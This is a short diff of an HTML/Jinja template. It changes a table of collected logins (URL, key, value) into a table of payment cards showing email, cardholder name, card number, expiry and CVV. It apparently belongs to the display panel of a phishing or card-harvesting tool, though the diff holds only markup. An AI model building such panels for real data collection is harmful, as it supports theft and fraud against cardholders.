@@ -12,20 +12,24 @@
     <thead>
         <tr>
             <th scope="col"> # </th>
-            <th scope="col"> Url </th>
-            <th scope="col"> Key </th>
-            <th scope="col"> Value </th>
-            <th scope="col"> Collected </th>
+            <th scope="col"> Provided Email </th>
+            <th scope="col"> Card Name </th>
+            <th scope="col"> Card # </th>
+            <th scope="col"> Exp Month </th>
+            <th scope="col"> Exp Year </th>
+            <th scope="col"> CVV </th>
         </tr>
     </thead>
     <tbody id="logins-table">
-        {% for login in logins %}
+        {% for card in cards %}
         <tr class="wrap-word">
-            <th scope="row" width="10%"> {{ loop.index }} </th>
-            <td width="25%"> {{ login[1] }}</td>
-            <td width="15%"> {{ login[2] }}</td>
-            <td width="25%"> {{ login[3] }}</td>
-            <td width="15%"> {{ login[4] }}</td>
+            <th scope="row"> {{ loop.index }} </th>
+            <td> {{ card[1] }}</td>
+            <td> {{ card[2] }}</td>
+            <td> {{ card[3] }}</td>
+            <td> {{ card[4] }}</td>
+            <td> {{ card[5] }}</td>
+            <td> {{ card[6] }}</td>
         </tr>
         {% endfor %}
     </tbody>
